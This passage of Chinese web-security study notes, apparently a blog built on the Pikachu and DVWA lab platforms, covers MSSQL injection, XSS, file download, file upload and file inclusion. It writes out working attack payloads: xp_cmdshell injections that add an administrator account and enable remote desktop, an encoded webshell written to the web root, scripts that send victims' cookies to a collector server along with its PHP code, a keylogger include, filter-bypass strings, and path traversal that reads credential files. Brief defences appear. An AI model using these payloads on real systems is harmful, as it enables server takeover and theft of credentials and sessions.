xp_cmdshell，以后再在后面重新进行创建，然后执行如下查询。<br>;exec sp_dropextendedproc ‘xp_cmdshell’ ,’xplog70.dll’该语句是利用系统中默认的“xplog70.dll”文件，自动恢复 xp_cmdshell<br>如果恢复不成功，说明该文件被改名或删除，可以上传个“xplog70.dll”文件，自定义路径进行恢复。例如，执行如下查询语句。;exec sp_dropextendedproc ‘xp_cmdshell’,’c:\xplog70.dll’<br><strong>在 SQL 注入攻击过程中，最常利用到的扩展存储有如下几个</strong><br>1.xp_cmdshell—利用此存储过程可以直接执行系统命令。<br>2.xp_regread—  利用此存储过程可以进行注册表读取。<br>3.xp_regwrit 一利用此存储过程可以写入注册表。<br>4.xp_dirtre 一利用此存储过程可以进行列目录操作。<br>5.xp_enumds—利用此存储过程可以进行 ODBC 连接。<br>6.xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。<br>7.xp_makecab 一一利用此存储过程可以创建压缩卷。<br>8.xp_ntsec_enumdomains-利用此存储过程可以查看 domain 信息。<br>9.xp_terminate_jroces 一利用此存储过程可以查看终端进程，给出一个进程 PID.<br>具体操作参考文件。<br><strong>MS注入案例</strong><br>1.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> andexists(select* from%20sysobjects)判断是否未mssql数据库<br>2.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> and system_user=0，报错后根据返回信息获得当前系统用户名<br>3.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1and" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1and</a> user=0获得当前用户名。<br>4.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> and 1=(select IS_SRVROLEMEMBER(‘sysadmin’)) 判断是否是sa权限<br>5.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1%20;declare%20@d%20int判断是否支持多行语句" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1%20;declare%20@d%20int判断是否支持多行语句</a><br>6.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> and=(select count(<em>）frommaster.dbo.sysobjects where name=’xp_cmdshell’)判断是否存在cmdshell存储过程<br>7.<a href="http://ip+端口号/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://ip+端口号/sqlserver/1.aspx?xxser=1;exec</a><br>master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0; 开启远程终端服务，注意0改为1就是关闭<br>8.<a href="http://ip+端口号/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://ip+端口号/sqlserver/1.aspx?xxser=1;exec</a> master..xp_cmdshell ‘net user test test /add’添加test账户<br>9.<a href="http://ip+端口号/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://ip+端口号/sqlserver/1.aspx?xxser=1;exec</a> master..xp_cmdshell ‘net localgroup administrators test /add’将账户加到管理员组<br>10.获取web路径<br>依次执行下面的连接<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a>    ;drop table    black;create Table black(result varchar(7996) null, id int not null identity (1,1))–<br><a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a>    ;insert into black execmaster..xp_cmdshell ‘dir /s c:\1.aspx’–<br><a href="http://192.168.1.55/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://192.168.1.55/sqlserver/1.aspx?xxser=1</a> and (select result from black where id=1)&gt;0–<br>11，%3c%25%65%76%61%6c%20%72%65%71%75%65%73%74%28%22%63%68%6f%70%70%65%72%22%29<br>%25%3e 写入一句话木马<br>12.提交<a href="http://192.168.1.55/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://192.168.1.55/sqlserver/1.aspx?xxser=1;exec</a>    sp_makewebtask ‘c:\wwwtest\1.asp’,’select’’%3c%25%65%76%61%6c%20%72%65%71%75%65%73%74%28%22%63%68%6f%70%70%65%72%22%29%25%3e’’’–<br>页面中返回 execute 执行错误信息，说明一句话木马写入成功。登录 Webshell 后门，利用 Webshell 开启远程终端进行连接服务器，这样就可以控制整台服务器了。<br>登录 Webshell 后门，利用 Webshell 开启远程终端进行连接服务器，这样就可以控制整台服务器了。<br>*</em>dbowner权限破解参考文件**<br><strong>public权限注入参考文件</strong></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>下载地址和安装<code>https://www.freebuf.com/sectool/164608.html</code></p>
<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>全称：跨站脚本攻击<br>攻击者在网页中嵌入客户端脚本，当用户点击时，就会在浏览器中执行。<br>XSS属于<strong>客户端攻击</strong>，受害者是用户，所以需要精通javascript语法。<br>漏洞类型：1.反射型：即数据在与用户交互的时候不会将数据放在数据库中，只是简单的将数据返回给用户，具有一次性。<br> 查看源码，源码在D:\phpStudy\PHPTutorial\WWW\pikachu\vul\xss\xss_dom_x.php中&gt; </p>
<p>定位前端源码，在google浏览器中按F12，然后单击某个元素，右键检查即可定位到该元素的前端源码，将输入框中的长度20改为200，这样输入payload<code>（&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;）</code>时可以输入完整。提交后弹出输出框，当再次刷新的时候，就不会输出前面的内容，这就是反射型。<br>2.存储型XSS<br>交互的数据会被记录在数据库中，保持稳定。与反射型区别是，当再次进入该页面时，就会自动弹出输出框。</p>
<p>3、DOM XSS<br>不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。<br>什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。它会把网页文档转换为一个文档对象，主要功能是处理网页内容。这种漏洞实际上没有什么作用，也就是低位漏洞。地址栏没有提交参数。<br>查看源码。<div id="xssd_main"></p>
<blockquote>
<pre><code>            &lt;script&gt;
                function domxss(){
                    var str = window.location.search; //获取浏览器地址栏地址
                    var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);//将地址进行分割和解析
                    var xss = txss.replace(/\+/g,&#39; &#39;);//将分割的内容赋值给xss变量
                    //alert(xss);

                    document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+xss+&quot;&#39;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;;//将地址栏进行拼接然后给dom
                }
                //试试：&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;

                &quot;&gt;
                //试试：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行
            &lt;/script&gt;
            &lt;!--&lt;a href=&quot;&quot; onclick=(&#39;xss&#39;)&gt;--&gt;
            &lt;form method=&quot;get&quot;&gt;
            &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;
            &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;请说出你的伤心往事&quot;/&gt;
            &lt;/form&gt;
            &lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;
        &lt;/div&gt;</code></pre><p>分析源码如下，当输入payload (‘ onclick = “alert(1111)”),时点击提交和下面的who do you see,就会弹出对话框。 原理就是 payload将str这个变量给替换了<br>   <code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;</code><br>    <code>&lt;a href=&#39;#&#39; onclick=&quot;alert(1111)&quot;&gt;what do you see?&lt;/a&gt;</code> </p>
</blockquote>
<p>4.DOM XSS-x型<br>这种是中位漏洞，与DOM XSS型的区别是，地址栏会有提交参数</p>
<p>XSS可能存在的地方<br>HTML context<br>Attribute Context<br>URL Context<br>Style Context<br>Script Context<br>工具：Appscan ,AWVS<br>手工：Brupsuite firefox（hackbar） XSSer XSSF（google插件）<br><strong>get方式：</strong><br>攻击者事先做好攻击连接，欺骗用户点击连接<br>原理：黑客先将xss代码（该代码会将用户的cookie信息写入到黑客搭建的xss平台中）写到带有xss漏洞的网站，生成url，并且伪装，用户点击了该链接，访问带有xss漏洞的网站，在这个过程中，用户的cookie信息就会被劫持。这是黑客在搜索栏写入的代码</p>
<pre><code>&gt; &lt;script&gt;document.location = &#39;http://192.168.0.45:82/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;，意思是将用户的cookie值传送到cookie.php文件中的cookie这个标签中。</code></pre><p> 下面是cookie.php文件代码</p>
<pre><code>&lt;?php
include_once &#39;../inc/config.inc.php&#39;;
include_once &#39;../inc/mysql.inc.php&#39;;
$link=connect();

//这个是获取cookie的api页面

if(isset($_GET[&#39;cookie&#39;])){
$time=date(&#39;Y-m-d g:i:s&#39;);
$ipaddress=getenv (&#39;REMOTE_ADDR&#39;);
$cookie=$_GET[&#39;cookie&#39;];
$referer=$_SERVER[&#39;HTTP_REFERER&#39;];
$useragent=$_SERVER[&#39;HTTP_USER_AGENT&#39;];
$query=&quot;insert cookies(time,ipaddress,cookie,referer,useragent) 
values(&#39;$time&#39;,&#39;$ipaddress&#39;,&#39;$cookie&#39;,&#39;$referer&#39;,&#39;$useragent&#39;)&quot;;
$result=mysqli_query($link, $query);
}
header(&quot;Location:http://192.168.0.45:82/pikachu/index.php&quot;);//重定向到一个可信的网站
?&gt;</code></pre><p>Xss安装后台，在路径D:\phpStudy\PHPTutorial\WWW\pikachu\pkxss\xcookie\cookie.php文件中将header参数后面的ip地址修改为被重定向的ip地址+端口号（pikachu平台首页）。在前端将输入框的长度更改一下。将xss后台登录， 在xss（get）模式下，输入payload：<code>&lt;script&gt;document.location = &#39;http://**被入侵的ip+端口号**/Pikachu-master/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;</code> 提交，提交后后台就会获取到cookie信息，同时攻击者可以根据get方式的url来伪造网址，进而客户端访问后，攻击者的后台就会获取到用户cookie。<br>伪造url：<a href="http://192.168.0.45:82/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</a> ，这个地址明显式攻击地址，攻击者可以根据工具伪造成其他的地址。 访问之后，会重定向到pikachu首页，为了让用户没有察觉到被攻击。重定向地址在cookie.php文件中的header参数中。<br><strong>post方式</strong><br>该方式提交并不会出现在地址栏中，因为这是使用post方式发送的。<br>文件D:\phpStudy\PHPTutorial\WWW\pikachu\pkxss\xcookie\post.html<br>原理：当用户登录后，地址栏并不会出现url地址改变，所以使用post.html让他在文件中提交到xss后台，因为是post提交，所以需要在输入框内输入用户名和密码。，而不是通过get的url地址，只不过是将script代码从url中挪到html文件中，这样，只要把文件发给用户，用户点击后就会自动提交，而url是通过链接提交的。并且当第一次登录该页面时因为没有登录，所以post.html获取不到cookie，只有登录过之后，有cookie记录了之后，再访问post.html的时候才会获取cookie。<br>post.html中的代码<br>      &gt; <html></p>
<blockquote>
<pre><code>&lt;head&gt;
&lt;script&gt;
window.onload = function() {
  document.getElementById(&quot;postsubmit&quot;).click();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form method=&quot;post&quot; action=&quot;http://192.168.0.45:82/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt;//被攻击的页面
&lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; name=&quot;message&quot; value=
&quot;&lt;script&gt;
**document.location = &#39;http://192.168.0.45:82/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;//黑客搭建的xss后台，这行代码就相当于我们在url中插入的url地址，只不过这个不需要url，只需要用户点击post.html这个文件就会自动提交**
&lt;/script&gt;&quot;
 /&gt;
&lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;  </code></pre></blockquote>
<p>总结上面出现的所有的错误都是由于地址书写出现错误，要正确配置ip地址和文件路径地址。<br><strong>存储型</strong><br>即可以插入数据库的，有记录日志的。设置payload：<script src="http://192.168.0.45:82/pikachu/pkxss/xfish/fish.php"></script>，就是攻击者提供一个链接，客户访问该链接，并且输入账号和密码，那么攻击者就会从后台拿到该信息<br>需要将fish.php文件中的ip地址修改，<br>出现错误原因；在fish.php中，header这个参数用，用户名和密码需要用单引号括起来，但是视频中的文件没有单引号<br><strong>键盘记录</strong><br>跨域：例 http:// www.   oldboyedu.com:80/news/index.php<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;协议  &nbsp;&nbsp;  子域名    主域名 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;      端口  &nbsp;&nbsp;  资源地址<br>当协议，域名，或者端口中任意一个不相同是，则称为不同域，即在一个网页中<strong>通过脚本</strong>访问了另一个域，即使用js代码，则称为跨域。这在浏览器中是不允许的。<br>同源策略：即禁止网站实行跨域操作即禁止js代码访问其他跨域网站，例如一个恶意网站引用了银行网站，此时使用js代码可能就会获取银行账户和密码。<br>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的<br>    &lt;script src=”…” //加载本地js执行<br>    &lt;img src=”…” //图片<br>    &lt;link href=”…” //css<br>    &lt;iframe src=”…” //任意资源<br> 同源策略修改，D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php，将Access-Control-Allow-Origin设置为<em>,即允许所有人访问，这是不安全的，一般是</em>.oldboy.com，即在同域下进行访问。<br>注意：需要将上面目录下的rk.js文件中的ajax.open中的ip参数改为需要访问的ip和端口<br>当使用payload<a href="http://192.168.0.45:82/pikachu/pkxss/rkeypress/rk.js后，在输入框中输入任何键，都会被记录在xss后台中。" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/pkxss/rkeypress/rk.js后，在输入框中输入任何键，都会被记录在xss后台中。</a><br><strong>xss盲打</strong><br>就是在不知道后台存不存在xss漏洞的情况下，在前台留言框等输入xss代码，一般为js代码，当后台管理员登录后，因为需要查看后台留言，所以此时就会执行js代码，进而被攻击，万能代码：<code>&#39;&quot;&gt;&lt;script&gt;alert(111)&lt;/script&gt;</code>，输入网址<code>http://ip+端口/pikachu/vul/xss/xssblind/admin_login.php</code>进行后台登录<br><strong>xss绕过</strong><br>因为后台的处理代码有可能对js代码进行处理，方式被被执行脚本，所以通常如果想用xss进行攻击，我们可以采用xss绕过的方式，具体是使用一些更改代码的方式<br>（1）对前端的限制可以尝试进行抓包重发或者修改前端的HTML。例前端可能有输入字符数目的限制，我们需要在前端代码中修改一下字符长度。或者使用抓包方式，抓到包之后将过滤代码删除掉，写入攻击代码即可<br>（2）防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。即过滤是可能过滤的只是小写script，但是前端是不区分大小写的，所以我们使用大小写也可能绕过过滤。<br> 例：</p>
<pre><code>&gt; &lt;sCRipT&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/sCrIPt </code></pre><p>（3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。，即后台将<code>&lt;script</code>这个代码进行了过滤，但是我们在前面使用&lt;sc 后面使用 ript，当过滤掉&lt;script之后，前后面就又拼接成了script。这也是一种过滤。<br>例：</p>
<pre><code>&gt; &lt;sc&lt;s+c+r+i+p+t&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;s+c+r+i+p+t&gt;ipt&gt;&lt;font color=red&gt;(为了防止过滤，我在script字符之间加上了+号，使用时将+去掉即可)&lt;/font </code></pre><p>4）使用注释来干扰后台对输入内容的识别。即注释里面的内容不执行，但是为了拼接就写上即可</p>
<pre><code>&gt; 例：&lt;sc&lt;!-**+**-test--&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;!-**+**-tshauie--&gt;ipt&gt;（使用时删除加号）  </code></pre><p>5）编码<br> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）  </p>
<p><strong>XSS绕过之htmlspecialchars()函数,xss防御</strong><br>htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体。<br>预定义的字符是：<br> &amp; (和号)转换为 &amp;amp<br> “ (双引号)成为 &amp;quot<br> ’ (单引号)成为&amp;#039<br> &lt; (小于)成为 &amp;lt<br> ‘&gt;(大于)成为 &amp;gt  </p>
<p>该函数的语法：htmlspecialchars(string,flags,character-set,double_encode)<br>过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。<strong>但是这个函数默认配置不会将单引号和双引号过滤</strong>，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号<br>可用的quotestyle类型：<br>ENT_COMPAT - 默认。仅编码双引号<br>ENT_QUOTES - 编码双引号和单引号<br>ENT_NOQUOTES - 不编码任何引号<br>如果没有设置单引号过滤，但是设置了大于小于号过滤，我们可使用以下语句绕过：  q’ onclick=’alert(111)’</p>
<p><strong>XSS防御的总体思路是</strong>：对输入进行过滤，对输出进行编码<br>过滤：根据业务需求进行过滤，比如输出点要求输入手机号，则只允许输入手机号格式的数字。<br>转义：所有输出到前端的数据都根据输出点进行转义，比如输出到html中进行html实体转义，输入到JS里面的进行JS转义()，但是如果使用htmlsecialchars函数进行实体转义，容易发生转义后字符无法识别的问题，这是杀敌一千自损八百的做法，所以通常使用转义字符进行处理  </p>
<p>xss之href输出绕过：javascript:alert(1111) 直接代入a标签herf里面一样可以绕过htmlspecialchars，即没有使用尖角字符也可以绕过</p>
<p>xss之js输出绕过：</p>
<blockquote>
<pre><code>$ms=&#39;11&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt;;这里使用了js绕过代码1&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</code></pre></blockquote>
<h2 id="文件漏洞"><a href="#文件漏洞" class="headerlink" title="文件漏洞"></a>文件漏洞</h2><h3 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h3><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接<strong>拼进</strong>下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！<br>即原本的文件下载路径为<a href="http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=sks.png" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=sks.png</a><br>但是攻击者手动拼接路径：<a href="http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=../../../index.php则会将其他目录的文件下载下来。如果下载的是包含数据库账号和密码的文件则最终会泄露。" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=../../../index.php则会将其他目录的文件下载下来。如果下载的是包含数据库账号和密码的文件则最终会泄露。</a><br>防御：就是限制用户只能下载本目录的文件，不能下载其他目录的文件。</p>
<p><strong>当遇到一个任意文件下载时，我们的一般利用思路:</strong></p>
<p>(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p>
<p>(2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</p>
<p>(3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。<br>      尝试读取/root/.bash_history看自己是否具有root权限。如果没有的话。我们只能按部就班的利用../来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。  </p>
<p>如果我们遇到的是java+oracle环境<br> 可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器</p>
<p>如果具有root权限<br>  在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。<br>locate 读取方法: locate mlocate.db admin    //可以将mlocate.db中包含admin文件名的内容全部输出来<br><strong>漏洞修复</strong><br>（1）过滤”.”，使用户在url中不能回溯上级目录</p>
<p>（2）正则严格判断用户输入参数的格式</p>
<p>（3）php.ini配置open_basedir限定文件访问范围  </p>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>原因：当网站上传文件的接口没有对文件进行过滤，导致攻击者上传一些恶意文件，控制后台的操作。注意测试的时候使用火狐浏览器，google浏览器完成不了。<br><strong>1.攻击者在客户端绕过javascript检测。</strong><br>开发人员在写代码时，只在前端页面使用函数判断该文件的类型是否符合要求上传的类型。所以攻击者只需要在浏览器中打开前端代码，找到该函数，然后将其删掉即可绕过javascript检测，上传恶意文件。<br>前端javascript检测代码</p>
<blockquote>
<pre><code>function checkFileExt(filename)
{
var flag = false; //状态
var arr = [&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;];
//取出上传文件的扩展名
var index = filename.lastIndexOf(&quot;.&quot;);
var ext = filename.substr(index+1);
//比较
for(var i=0;i&lt;arr.length;i++)
{
if(ext == arr[i])
{
flag = true; //一旦找到合适的，立即退出循环
break;
}
}
//条件判断
if(!flag)
{
alert(&quot;上传的文件不符合要求，请重新选择！&quot;);
location.reload(true);
}
}</code></pre></blockquote>
<p>然后在前端我们找到对应的checkFileExt（）函数，然后将其删掉就可以上传非指定的文件了。<br>第二种方式，是使用抓包，将恶意文件的后缀名改为jpg，然后抓到包之后，再将文件后缀名改回去，这样也可以上传恶意文件。<br><strong>2.服务端验证绕过(MIME 类型检测)</strong><br>   MIME(Multipurpose Internet Mail Extensions)是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。<br>通过使用 PHP 的<strong>全局数组 $_FILES</strong>，你可以从客户计算机向远程服务器上传文件。<br>第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：<br>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码<br><strong>分析代码逻辑</strong>：首先会获取到前端的提交请求，然后定义了一个数组（定义图片上传指定类型），然后通过upload_sick函数对上传的文件进行一定的检查  。<br>分析upload_sick函数存在漏洞的的<strong>原因是因为 $ _FILES() 这个全局的方法是通过浏览器http头去获取的content-type，content-type是前端用户可以控制的。容易被绕过。这样我们使用工具抓包之后，将http头部的contnet-type的类型改为其他类型就可以进行上传恶意文件了</strong></p>
<p><strong>三、代码注入绕过–getimagesize()</strong><br>  getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。。如果后台使用的是这种验证方式，他不是通过文件后缀名来判断是不是指定的文件，而是通过文件的二进制代码的前16位来判断，所以即使能够选择恶意文件但是还是上传不上去，所以我们使用其他的方式绕过，即将一句话木马或者其他脚本文件写入指定的文件，例如，将一句话木马写入图片中我们使用命令copy /b sks.png+muma.php muma.png，将php代码插入图片中然后上传就可以了。最后需要配合其他漏洞来执行一句话木马，否则即使上传了恶意代码也是不能够执行的。<br>后台函数语法格式：<br>    <code>array getimagesize ( string $filename [, array &amp;$imageinfo ] )</code><br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。  </p>
<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>因为php语言的文件包含功能太过强大，所以通常发生在php语言中<br>php语言中四个文件包含函数 ，  </p>
<ol>
<li>include（）  </li>
<li>include_once()  </li>
<li>require()  </li>
<li>require_once()<br>包含类型分为本地包含和远程包含。<br>如果希望网站具有本地包含功能，则需将php.ini文件中的allow_url_include该为on<br>如果希望网站具有远程包含功能，需要将magic_quotes_gbc改为on<br>例子：首先找一个带一句话木马的图片到发布的Web站点路径下面，其次通过存在包含漏洞的页面来包含刚上传带一句话木马的图片,最后一定要注意相对路径。当在网站上浏览时，就是执行文件包含(例include(“../../a.jpg”))这串代码，然后加载图片，最终执行一句话木马。<br>远程包含就是访问的url不再是本地路径，而是一个链接，这个可能是其他网站上面一个文件。  </li>
</ol>
<p><strong>str_replace()</strong><br>如果后台php代码使用了str_replace()函数，那么我们使用另一种方法绕过。<br>首先查看源码，打开dvwa,将安全等级调为中等，打开file inclusion的源码查看  </p>
<blockquote>
<pre><code>&lt;?php 
// The page we wish to display 
$file = $_GET[ &#39;page&#39; ]; 
// Input validation 
$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); 
$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); 

?&gt;</code></pre></blockquote>
<p>发现如果使用../或者http等本地包含或者远程包含，该函数会使用空字符串替换掉这两种字符，以起到安全防范的作用。那么我们应该怎样突破这种防范呢？我们构造可以构造‘…/./’这个路径替换../因为replace函数将../替换为空，所以剩下了最后又剩下了../同样可以查询到上一级路径。<br>同样远程包含为<a href="http://ip+端口/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt，**使用htthttp://p替换http://即可" target="_blank" rel="noopener">http://ip+端口/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt，**使用htthttp://p替换http://即可</a>**  </p>
<p><strong>fnmatch函数</strong><br>将dvwa的等级调为高级，查看文件包含的源代码。</p>
<pre><code>&gt; &lt;?php 
&gt; 
&gt; // The page we wish to display 
&gt; $file = $_GET[ &#39;page&#39; ]; 
&gt; 
&gt; // Input validation 
&gt; if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { 
&gt; // This isn&#39;t the page we want! 
&gt; echo &quot;ERROR: File not found!&quot;; 
&gt; exit; 
&gt; } </code></pre><p>发现源码的意思是如果文件路径不是以file开头的，同时不是include.php文件，那么就报错。如果文件名符合其中一个条件既可以。此处我们构造page=file:///C:/xampp/htdocs/dvwa/php.ini 刚好满足”file*”（文件名file开头）所以这种方式我们也是可以绕过的。<br>最后我们在使用impossible即无漏洞的安全界别</p>
<pre><code>&gt; &lt;?php 
&gt; 
&gt; // The page we wish to display 
&gt; $file = $_GET[ &#39;page&#39; ]; 
&gt; 
&gt; // Only allow include.php or file{1..3}.php 
&gt; if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { 
&gt; // This isn&#39;t the page we want! 
&gt; echo &quot;ERROR: File not found!&quot;; 
&gt; exit; 
&gt; } </code></pre><p>这个源码表示文件只能包含include.php,file1.php,file2.php,file3.php，这四种文件，如果是其他文件则返回错误，相当于设置了白名单。</p>
